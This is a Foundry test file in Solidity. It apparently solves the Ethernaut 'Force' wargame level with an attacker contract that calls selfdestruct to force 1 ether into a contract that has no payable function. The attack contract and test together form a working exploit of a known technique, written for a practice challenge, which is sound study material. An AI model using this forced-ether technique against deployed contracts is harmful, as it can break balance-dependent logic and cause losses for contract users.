pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {Force} from "../src/07-force.sol";

contract Force07Test is Test {
    Force fce;
    Fire fir;

    function setUp() public {
        emit log_string("🧪 Setup ForceTest...");
        fce = new Force();
        fir = new Fire(address(fce));
        emit log_named_uint("Balance of force is: ", address(fce).balance);
    }

    function testForce() public {
        emit log_string("🧪 Cracking Force...");
        address bob = mkaddr("bob");
        vm.startPrank(bob);
        vm.deal(bob, 100 ether);
        address(fir).transfer(1 ether);
        fir.attack();
        vm.stopPrank();
        emit log_named_uint("Balance of force is: ", address(fce).balance);
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}

contract Fire {
    address public addr;

    constructor(address _addr) public {
        addr = _addr;
    }

    function attack() public {
        selfdestruct(payable(addr));
    }

    receive() external payable {
        require(msg.value > 0);
    }
}
